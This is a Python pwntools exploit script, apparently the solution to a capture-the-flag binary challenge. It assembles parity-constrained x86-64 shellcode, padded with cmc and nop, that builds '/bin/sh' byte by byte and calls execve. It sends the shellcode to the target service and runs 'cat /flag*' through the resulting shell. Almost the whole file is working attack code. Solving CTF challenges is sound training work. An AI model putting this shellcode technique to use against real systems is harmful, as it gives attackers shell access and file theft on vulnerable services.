#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.os = "linux"
if args.GDB:
    context.binary = ELF("./chall")
    p = gdb.debug(context.binary.path, '''
        b *main+473
        c
    ''')
elif args.LOCAL:
    context.binary = ELF("./chall")
    p = process(aslr=True)
else:
    p = remote("localhost", 1337)

# Gadgets:
# * cmc & nop can fix parity between instructions
# * shl 7 + 1 = 8
# * build arbitrary integer by doing byte by byte (adding 1 if needed for parity)
# * get `rip` register by popping 4 times at the start (buf variable)
# * build `syscall` 0x7f in front of start, then set up registers for execve
# * nop slide at the end (one will be overwritten by syscall)

# https://godbolt.org/z/vYYoTqx9f
payload = asm("""
pop rdx
cmc
pop rdx
cmc
pop rdx
cmc
pop rdx
cmc
add rdx, 0x7f

sub rax, rax
cmc
mov al, 0x05
shl rax, 7
shl rax, 1
cmc
mov al, 0x0f

mov qword [rdx], rax
cmc

sub rax, rax
cmc
mov al, 0x67
add al, 1
shl rax, 7
shl rax, 1
cmc
mov al, 0x73
shl rax, 7
shl rax, 1
cmc
mov al, 0x2f
shl rax, 7
shl rax, 1
cmc
mov al, 0x6d
add al, 1
shl rax, 7
shl rax, 1
cmc
mov al, 0x69
shl rax, 7
shl rax, 1
cmc
mov al, 0x61
add al, 1
shl rax, 7
shl rax, 1
cmc
mov al, 0x2f
push rax
cmc
push rsp
pop rdi
xor rax, rax
cmc
mov al, 59
nop
xor esi, esi
cmc
xor rdx, rdx
""".replace("word ", "word ptr ") + "cmc\nnop\n"*0x80)
print(hexdump(payload))

p.sendafter(b">>> ", payload)
p.clean(0.5)
p.sendline(b"cat /flag*")

print(p.clean(0.5).decode())
